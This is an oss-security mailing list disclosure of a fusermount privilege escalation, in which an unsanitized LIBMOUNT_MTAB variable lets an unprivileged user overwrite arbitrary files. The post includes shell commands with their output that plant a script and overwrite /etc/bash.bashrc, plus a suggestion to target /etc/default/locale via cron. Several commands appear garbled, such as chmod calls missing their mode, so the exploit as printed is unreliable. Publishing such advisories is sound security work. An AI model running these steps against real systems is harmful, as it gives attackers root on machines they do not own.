  oss-security - fuse privilege escalation            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 21 May From: Tavis Ormandy <taviso@...gle.com> To: oss-security@...ts.openwall.com Subject: fuse privilege escalation  Hello, this was discussed on the distros list last week.  The fusermount binary calls setuid(geteuid()) to reset the ruid when it invokes /bin/mount so that it can use privileged mount options that are normally restricted if ruid != euid. That's acceptable (but scary) in theory, because fusermount can sanitize the call to make sure it's safe.   However, because mount thinks it's being invoked by root, it allows access to debugging features via the environment that would not normally be safe for unprivileged users and fusermount doesn't sanitize them.  Therefore, the bug is that the environment is not cleared when calling mount with ruid=0. One debugging feature available is changing the location of /etc/mtab by setting LIBMOUNT_MTAB, which can be abused to overwrite arbitrary files.  This can be exploited like so.  $ printf "chmod /bin/dash" > /tmp/exploit && chmod /tmp/exploit $ mkdir -p '/tmp/exploit||/tmp/exploit' $ LIBMOUNT_MTAB=/etc/bash.bashrc  _FUSE_COMMFD=0 fusermount '/tmp/exploit||/tmp/exploit' fusermount: failed to open /etc/fuse.conf: Permission denied sending file descriptor: Socket operation on non-socket $ cat /etc/bash.bashrc /dev/fuse /tmp/exploit||/tmp/exploit fuse rw,nosuid,nodev,user=taviso 0 0  Then simply wait for root to login, or alternatively overwrite /etc/default/locale and wait for cron to run a script that sources it. That means root wouldn't have to log in, but you would have to wait around until midnight to check if it worked.  Tavis.  P.S. Just for fun, I also came up with a version that fits in a tweet  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      